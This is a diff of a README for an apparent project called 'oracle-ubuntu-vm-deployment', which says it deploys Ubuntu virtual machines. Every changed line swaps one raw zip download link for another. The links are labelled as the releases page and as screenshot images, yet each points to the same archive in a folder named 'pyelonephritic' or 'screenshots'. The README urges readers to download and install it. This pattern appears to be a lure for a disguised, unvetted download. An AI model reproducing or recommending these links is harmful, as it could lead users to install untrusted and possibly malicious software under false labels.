@@ -1,6 +1,6 @@
 # 🚀 oracle-ubuntu-vm-deployment - Easily Deploy Ubuntu VMs on Your Computer
 
-[![Download from Releases](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/pyelonephritic/oracle-ubuntu-vm-deployment.zip%20Now-Direct%20Link-brightgreen)](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/pyelonephritic/oracle-ubuntu-vm-deployment.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/screenshots/deployment-vm-oracle-ubuntu-1.3.zip%20Now-Direct%20Link-brightgreen)](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/screenshots/deployment-vm-oracle-ubuntu-1.3.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ Before you start, ensure you have the following:
 To begin with the deployment, you will need to download the latest release of the software. Follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access the releases:
-   [Download from Releases](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/pyelonephritic/oracle-ubuntu-vm-deployment.zip)
+   [Download from Releases](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/screenshots/deployment-vm-oracle-ubuntu-1.3.zip)
 
 2. **Choose the Right Release**: Look for the latest version listed. This will usually have the highest version number.
 
@@ -40,7 +40,7 @@ To begin with the deployment, you will need to download the latest release of th
 To download and install the application:
 
 1. **Go to the Releases Page**: Use the link provided below to reach the download area:
-   [Download from Releases](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/pyelonephritic/oracle-ubuntu-vm-deployment.zip)
+   [Download from Releases](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/screenshots/deployment-vm-oracle-ubuntu-1.3.zip)
 
 2. **Select the Download File**:
    - If you use VirtualBox, download the relevant file that ends with `.ova` or `.vbox`.
@@ -65,8 +65,8 @@ After installing the application, you may need to customize settings according t
 
 Check out the following screenshots for a better understanding of the application:
 
-- **VirtualBox Import**: ![VirtualBox Import Screenshot](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/pyelonephritic/oracle-ubuntu-vm-deployment.zip)
-- **EC2 Instance Launch**: ![EC2 Instance Launch Screenshot](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/pyelonephritic/oracle-ubuntu-vm-deployment.zip)
+- **VirtualBox Import**: ![VirtualBox Import Screenshot](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/screenshots/deployment-vm-oracle-ubuntu-1.3.zip)
+- **EC2 Instance Launch**: ![EC2 Instance Launch Screenshot](https://raw.githubusercontent.com/Edgar00000/oracle-ubuntu-vm-deployment/main/screenshots/deployment-vm-oracle-ubuntu-1.3.zip)
 
 ## 📖 Documentation
 
